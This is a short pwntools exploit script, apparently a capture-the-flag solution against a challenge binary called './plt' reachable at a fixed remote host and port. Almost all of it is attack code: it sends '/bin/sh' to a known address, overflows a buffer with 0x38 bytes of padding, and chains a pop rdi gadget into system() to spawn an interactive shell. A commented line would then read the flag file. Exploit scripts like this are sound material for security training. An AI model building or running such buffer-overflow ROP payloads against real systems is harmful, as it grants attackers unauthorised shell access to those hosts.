#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './plt'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2120

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

name = 0x0000000000601070
pop_rdi_ret = 0x0000000000400773

r.sendline('/bin/sh\x00')
r.send(b'A'*0x38 + p64(pop_rdi_ret) + p64(name) + p64(e.symbols['system']))
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
